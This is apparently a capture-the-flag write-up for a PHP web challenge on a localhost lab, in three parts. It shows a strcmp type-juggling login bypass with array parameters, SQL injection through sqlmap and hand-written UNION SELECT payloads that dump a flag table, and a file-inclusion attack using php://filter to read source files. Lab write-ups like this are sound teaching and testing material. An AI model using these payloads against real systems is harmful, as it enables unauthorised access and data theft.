# Part 1

The login function uses strcmp to check the username and password provided.

```php
    if(isset($_POST["username"]) && isset($_POST["password"]))
    {
        if (strcmp($_POST["username"], "admin") == 0 && strcmp($_POST["password"], "SuperSecurePasswordTheyWouldNeverGuess") == 0)
        {
            $_SESSION["isAdmin"] = true;
            header("Location: /admin.php");
            die();
        }

        $errorMessage = "Invalid username or password";
    }
```

With strcmp, the arguments must be strings, otherwise it leads to unintended behaviour. For example, comparing an array with a string gives `null`:

```
php > strcmp(array(), "hello!");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
```

In PHP, null is weakly equal to zero:
```
php > echo (null == 0) ? "True" : "False";
True
php > echo (null === 0) ? "True" : "False";
False
```

Therefore, sending an array within the form will cause both of the strcmp's to return `null`, bypassing the check.

```username[]=test&password[]=test```

Although an error is received when doing this, the SESSION cookie is set and you can navigate to `admin.php` for the flag.

# Part 2
The searching functionality is vulnerable to SQL injection. We can use SQLmap to dump the tables for us:

`sqlmap -u "http://localhost" --data "searchBy=aaaaaa" --dump --level 5`

After a few minutes, sqlmap will return the dumped content:
```
Database: webapp
Table: the_flag
[1 entry]
+------------------------------------------+
| flag                                     |
+------------------------------------------+
| WMG{w3_D0_4_L1TtL3_81t_0F_5Ql_1N3CJT10n} |
+------------------------------------------+
```

This can also be done manually if you'd prefer:
- Confirm the name of columns being returned: `' UNION SELECT 'test' as name, null, null -- -`
  - This confirms that the 'name' column is being returned as 'name' and will display in the DOM.
- Check the names of the columns in the database: `' UNION SELECT table_name as name, null, null FROM information_schema.columns -- -`
  - This gives us the table name with the flag `the_flag`.
- Check the names of the columns in the `the_flag` table: `' UNION SELECT column_name as name, null, null FROM information_schema.columns WHERE table_name='the_flag' -- -`
  - This gives us the column name `flag` inside `the_flag` table.
- Finally, we can select the flag out of this table: `' UNION SELECT flag as name, null, null FROM the_flag -- -`
  
```
<th scope='row'>WMG{w3_D0_4_L1TtL3_81t_0F_5Ql_1N3CJT10n}</th>
```

# Part 3

The reviews page uses `include` to load the review PHP files. However, there's no validation on the pages presented. Therefore, we can specify any page, for example, index:

`http://localhost/reviews.php?review=index`

This displays the index.php file. However, the PHP is processed, meaning we cannot see the source code of the page. However, we can utilise PHP's `php://filter` protocol to convert the pages to base 64, to prevent the PHP from being rendered.

`http://localhost/reviews.php?review=php://filter/convert.base64-encode/resource=index`

This reveals the `secrets.php` import, which we can then view for the flag.

`http://localhost/reviews.php?review=php://filter/convert.base64-encode/resource=secrets`